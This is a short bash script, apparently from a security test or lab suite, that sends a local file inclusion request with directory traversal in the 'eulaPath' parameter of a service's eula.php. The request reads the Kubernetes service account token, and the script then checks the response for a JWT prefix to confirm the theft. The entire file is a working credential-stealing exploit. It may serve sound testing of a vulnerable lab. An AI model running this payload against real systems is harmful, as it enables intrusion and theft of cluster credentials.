#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing LFI on ${service_map[secure-python-app]}"

output=$(curl -s "http://${service_map[secure-python-app]}/eula.php?eulaPath=../../../var/run/secrets/kubernetes.io/serviceaccount/token" \
  --insecure)
if [ $? -eq 0 ]; then
    echo "[+] LFI payload sent successfully"
else
    echo "[-] LFI payload failed to send"
    exit 1
fi
if echo "$output" | grep -q "eyJ"; then
    echo "[+] LFI attack executed successfully"
else
    echo "[-] LFI attack failed"
fi
